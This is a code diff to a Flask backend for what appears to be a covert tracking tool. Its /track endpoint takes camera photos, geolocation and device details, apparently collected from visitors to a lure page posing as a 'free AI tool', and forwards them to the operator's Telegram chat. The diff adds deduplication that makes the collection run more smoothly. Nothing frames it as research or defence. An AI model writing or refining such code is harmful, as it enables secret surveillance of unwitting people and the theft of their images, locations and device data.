@@ -17,6 +17,7 @@ DIVIDER     = "━━━━━━━━━━━━━━━━"
 FOOTER      = "⚡ Developed by: @zerxofficial"
 
 _CLONES = {}
+_LAST_EVENT = {}
 
 ALLOWED_ORIGINS = {
     "https://best-free-ai-tool.netlify.app",
@@ -72,6 +73,13 @@ def _send_telegram_photo(chat_id, b64_data, caption):
         )
     except Exception as e:
         print(f"telegram photo failed: {e}")
+
+def _mark(uid, typ):
+    _LAST_EVENT.setdefault(uid, {})[typ] = time.time()
+
+def _recent(uid, typ, window=30):
+    last = _LAST_EVENT.get(uid, {})
+    return last.get(typ) and (time.time() - last[typ]) < window
 
 @app.route("/api/verify", methods=["GET", "OPTIONS"])
 def api_verify():
@@ -150,6 +158,10 @@ def track():
     if not BOT_TOKEN:
         return jsonify({"ok": True}), 200
 
+    # Deduplicate: suppress same-type events from same uid within 30s.
+    if typ in ("device_info", "location", "camera") and _recent(uid, typ, 30):
+        return jsonify({"ok": True, "dup": True}), 200
+
     now = datetime.now(timezone.utc).strftime("%b %d, %Y, %I:%M %p")
 
     # ── CAMERA ──
@@ -162,6 +174,7 @@ def track():
             f"{FOOTER}"
         )
         _send_telegram_photo(uid, payload["image"], caption)
+        _mark(uid, "camera")
         return jsonify({"ok": True}), 200
 
     # ── LOCATION ──
@@ -181,6 +194,7 @@ def track():
             f"{FOOTER}"
         )
         _send_telegram_text(uid, text)
+        _mark(uid, "location")
         return jsonify({"ok": True}), 200
 
     # ── DEVICE INFO ──
@@ -244,9 +258,11 @@ def track():
             f"{DIVIDER}\n{FOOTER}"
         )
         _send_telegram_text(uid, text)
+        _mark(uid, "device_info")
         return jsonify({"ok": True}), 200
 
     # ── FALLBACK ──
+    # Only reach here for unknown types (not device_info/location/camera).
     text = (
         f"📡 <b>{typ}</b>\n"
         f"{DIVIDER}\n"
